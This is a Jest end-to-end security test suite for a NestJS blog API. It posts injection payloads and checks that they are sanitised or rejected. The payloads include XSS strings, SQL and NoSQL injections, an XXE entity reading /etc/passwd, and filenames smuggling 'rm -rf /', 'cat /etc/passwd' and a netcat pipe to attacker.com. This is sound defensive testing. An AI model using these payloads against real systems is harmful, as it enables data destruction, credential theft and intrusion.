import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../../src/app.module';

describe('XSS and Injection Security Tests', () => {
  let app: INestApplication;
  let authToken: string;
  let testUserId: string;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    await app.init();

    // Create test user and authenticate
    const signupResponse = await request(app.getHttpServer())
      .post('/auth/register')
      .send({
        email: 'security-test@example.com',
        username: 'securitytester',
        password: 'SecurePass123!',
        displayName: 'Security Tester',
      });

    testUserId = signupResponse.body.user._id;

    const loginResponse = await request(app.getHttpServer())
      .post('/auth/login')
      .send({
        email: 'security-test@example.com',
        password: 'SecurePass123!',
      });

    authToken = loginResponse.body.access_token;
  });

  afterAll(async () => {
    await app.close();
  });

  describe('XSS Prevention Tests', () => {
    describe('Script Tag Injection', () => {
      it('should sanitize script tags in post content', async () => {
        const maliciousContent = {
          title: 'Test Post',
          content: 'Normal content <script>alert("XSS")</script> more content',
          excerpt: 'Test excerpt',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousContent)
          .expect(201);

        expect(response.body.content).not.toContain('<script>');
        expect(response.body.content).not.toContain('</script>');
      });

      it('should sanitize script tags in user profile', async () => {
        const maliciousProfile = {
          bio: 'My bio <script>document.cookie</script>',
          website: 'https://example.com',
          displayName: 'User<script>alert(1)</script>',
        };

        const response = await request(app.getHttpServer())
          .patch('/users/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousProfile)
          .expect(200);

        expect(response.body.bio).not.toContain('<script>');
        expect(response.body.displayName).not.toContain('<script>');
      });

      it('should sanitize event handlers in HTML', async () => {
        const maliciousContent = {
          title: 'Test Post',
          content: '<img src="x" onerror="alert(\'XSS\')" /> <div onclick="steal()">Click</div>',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousContent)
          .expect(201);

        expect(response.body.content).not.toContain('onerror');
        expect(response.body.content).not.toContain('onclick');
      });
    });

    describe('JavaScript URL Injection', () => {
      it('should sanitize javascript: URLs', async () => {
        const maliciousContent = {
          title: 'Test Post',
          content: '<a href="javascript:alert(\'XSS\')">Click me</a>',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousContent)
          .expect(201);

        expect(response.body.content).not.toContain('javascript:');
      });

      it('should sanitize data: URLs with script content', async () => {
        const maliciousContent = {
          title: 'Test Post',
          content: '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousContent)
          .expect(201);

        expect(response.body.content).not.toContain('data:text/html');
        expect(response.body.content).not.toContain('<script>');
      });
    });

    describe('Style Injection', () => {
      it('should sanitize dangerous CSS', async () => {
        const maliciousContent = {
          title: 'Test Post',
          content: '<style>body { background: url("javascript:alert(1)"); }</style>',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousContent)
          .expect(201);

        expect(response.body.content).not.toContain('javascript:');
        expect(response.body.content).not.toContain('<style>');
      });

      it('should sanitize CSS expressions', async () => {
        const maliciousContent = {
          title: 'Test Post',
          content: '<div style="width: expression(alert(\'XSS\'))">Content</div>',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousContent)
          .expect(201);

        expect(response.body.content).not.toContain('expression(');
      });
    });

    describe('SVG XSS', () => {
      it('should sanitize malicious SVG', async () => {
        const maliciousSVG = `
          <svg onload="alert('XSS')">
            <script>alert('XSS')</script>
            <animate onbegin="alert('XSS')" />
          </svg>
        `;

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: 'Test Post',
            content: maliciousSVG,
            excerpt: 'Test',
            tags: ['test'],
          })
          .expect(201);

        expect(response.body.content).not.toContain('onload=');
        expect(response.body.content).not.toContain('<script>');
        expect(response.body.content).not.toContain('onbegin=');
      });
    });

    describe('Template Injection', () => {
      it('should prevent template injection', async () => {
        const templateInjection = {
          title: '{{7*7}}',
          content: '${7*7} <%= 7*7 %> {{constructor.constructor("alert(1)")()}}',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(templateInjection)
          .expect(201);

        // Ensure template expressions are not evaluated
        expect(response.body.title).not.toBe('49');
        expect(response.body.content).not.toContain('49');
        expect(response.body.content).toContain('{{'); // Should be treated as plain text
      });
    });

    describe('Encoded XSS Attempts', () => {
      it('should handle HTML entity encoded XSS', async () => {
        const encodedXSS = {
          title: 'Test',
          content: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(encodedXSS)
          .expect(201);

        // Should not decode and execute
        expect(response.body.content).not.toContain('<script>');
      });

      it('should handle URL encoded XSS', async () => {
        const urlEncodedXSS = {
          title: 'Test',
          content: decodeURIComponent('%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E'),
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(urlEncodedXSS)
          .expect(201);

        expect(response.body.content).not.toContain('<script>');
      });

      it('should handle Unicode encoded XSS', async () => {
        const unicodeXSS = {
          title: 'Test',
          content: '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e',
          excerpt: 'Test',
          tags: ['test'],
        };

        const response = await request(app.getHttpServer())
          .post('/posts')
          .set('Authorization', `Bearer ${authToken}`)
          .send(unicodeXSS)
          .expect(201);

        expect(response.body.content).not.toContain('<script>');
      });
    });
  });

  describe('SQL Injection Prevention Tests', () => {
    describe('Search Query Injection', () => {
      it('should handle SQL injection in search queries', async () => {
        const sqlInjectionQueries = [
          "'; DROP TABLE posts; --",
          "1' OR '1'='1",
          "admin'--",
          "1' UNION SELECT * FROM users--",
          "'; EXEC xp_cmdshell('cmd.exe'); --",
        ];

        for (const query of sqlInjectionQueries) {
          const response = await request(app.getHttpServer())
            .get('/posts/search')
            .query({ q: query })
            .set('Authorization', `Bearer ${authToken}`)
            .expect(200);

          // Should return results without executing SQL
          expect(response.body).toHaveProperty('posts');
          expect(Array.isArray(response.body.posts)).toBe(true);
        }
      });

      it('should handle SQL injection in sort parameters', async () => {
        const response = await request(app.getHttpServer())
          .get('/posts')
          .query({ 
            sort: 'createdAt; DROP TABLE posts; --',
            order: 'DESC; DELETE FROM users;',
          })
          .set('Authorization', `Bearer ${authToken}`)
          .expect(200);

        expect(response.body).toHaveProperty('posts');
      });
    });

    describe('NoSQL Injection Prevention', () => {
      it('should prevent NoSQL injection in MongoDB queries', async () => {
        const noSqlInjection = {
          email: { $ne: null },
          password: { $ne: null },
        };

        const response = await request(app.getHttpServer())
          .post('/auth/login')
          .send(noSqlInjection)
          .expect(400);

        expect(response.body.access_token).toBeUndefined();
      });

      it('should sanitize MongoDB operators in user input', async () => {
        const maliciousUpdate = {
          bio: { $set: { role: 'admin' } },
          displayName: { $unset: { password: 1 } },
        };

        const response = await request(app.getHttpServer())
          .patch('/users/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send(maliciousUpdate)
          .expect(400);

        // Verify user is not elevated to admin
        const profile = await request(app.getHttpServer())
          .get('/users/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .expect(200);

        expect(profile.body.role).not.toBe('admin');
      });

      it('should prevent query selector injection', async () => {
        const response = await request(app.getHttpServer())
          .get(`/posts/${JSON.stringify({ $ne: null })}`)
          .set('Authorization', `Bearer ${authToken}`)
          .expect(400);

        expect(response.body.message).toContain('Invalid');
      });
    });
  });

  describe('Command Injection Prevention Tests', () => {
    it('should prevent OS command injection in file names', async () => {
      const maliciousFileNames = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 1234',
        '$(whoami).txt',
        '`id`.txt',
      ];

      for (const fileName of maliciousFileNames) {
        // Attempt to upload with malicious filename
        const response = await request(app.getHttpServer())
          .post('/uploads/profile-picture')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', Buffer.from('test'), fileName)
          .expect(400);

        expect(response.body.message).toContain('Invalid file name');
      }
    });
  });

  describe('Path Traversal Prevention Tests', () => {
    it('should prevent path traversal in file uploads', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'uploads/../../../secret.txt',
        'uploads/../../config/database.yml',
      ];

      for (const path of pathTraversalAttempts) {
        const response = await request(app.getHttpServer())
          .post('/uploads/profile-picture')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', Buffer.from('test'), path)
          .expect(400);

        expect(response.body.message).toContain('Invalid file');
      }
    });

    it('should prevent path traversal in file retrieval', async () => {
      const pathTraversalPaths = [
        '/uploads/../../../etc/passwd',
        '/uploads/..\\..\\..\\windows\\system32\\config\\sam',
        '/uploads/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ];

      for (const path of pathTraversalPaths) {
        await request(app.getHttpServer())
          .get(path)
          .expect(404);
      }
    });
  });

  describe('XXE (XML External Entity) Prevention Tests', () => {
    it('should prevent XXE attacks in XML parsing', async () => {
      const xxePayload = `
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <post>
          <title>&xxe;</title>
          <content>Test</content>
        </post>
      `;

      const response = await request(app.getHttpServer())
        .post('/posts')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'application/xml')
        .send(xxePayload)
        .expect(400);

      expect(response.body.message).not.toContain('root:');
    });
  });

  describe('LDAP Injection Prevention Tests', () => {
    it('should sanitize LDAP special characters', async () => {
      const ldapInjectionAttempts = [
        'admin*)(uid=*',
        'admin)(|(uid=*',
        '*)(objectClass=*',
      ];

      for (const attempt of ldapInjectionAttempts) {
        const response = await request(app.getHttpServer())
          .post('/auth/login')
          .send({
            email: attempt,
            password: 'password',
          })
          .expect(400);

        expect(response.body.access_token).toBeUndefined();
      }
    });
  });

  describe('Header Injection Prevention Tests', () => {
    it('should prevent HTTP response splitting', async () => {
      const headerInjection = {
        displayName: 'User\r\nSet-Cookie: admin=true',
        bio: 'Bio\r\n\r\n<script>alert(1)</script>',
      };

      const response = await request(app.getHttpServer())
        .patch('/users/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(headerInjection)
        .expect(200);

      // Check that newlines are sanitized
      expect(response.body.displayName).not.toContain('\r\n');
      expect(response.body.bio).not.toContain('\r\n');
      
      // Verify no additional cookies were set
      const cookies = response.headers['set-cookie'] || [];
      expect(cookies.join(' ')).not.toContain('admin=true');
    });
  });

  describe('JSON Injection Prevention Tests', () => {
    it('should handle malformed JSON gracefully', async () => {
      const malformedJSON = '{"title": "Test", "content": "Test"';

      await request(app.getHttpServer())
        .post('/posts')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'application/json')
        .send(malformedJSON)
        .expect(400);
    });

    it('should prevent prototype pollution', async () => {
      const prototypePollution = {
        title: 'Test',
        content: 'Test',
        '__proto__': { 'isAdmin': true },
        'constructor': { 'prototype': { 'isAdmin': true } },
      };

      await request(app.getHttpServer())
        .post('/posts')
        .set('Authorization', `Bearer ${authToken}`)
        .send(prototypePollution)
        .expect(201);

      // Verify prototype wasn't polluted
      const obj = {};
      expect(obj['isAdmin']).toBeUndefined();
    });
  });

  describe('Content Security Tests', () => {
    it('should set proper Content-Type headers', async () => {
      const response = await request(app.getHttpServer())
        .get('/posts')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.headers['content-type']).toContain('application/json');
    });

    it('should prevent MIME type sniffing', async () => {
      const response = await request(app.getHttpServer())
        .get('/posts')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });
  });
});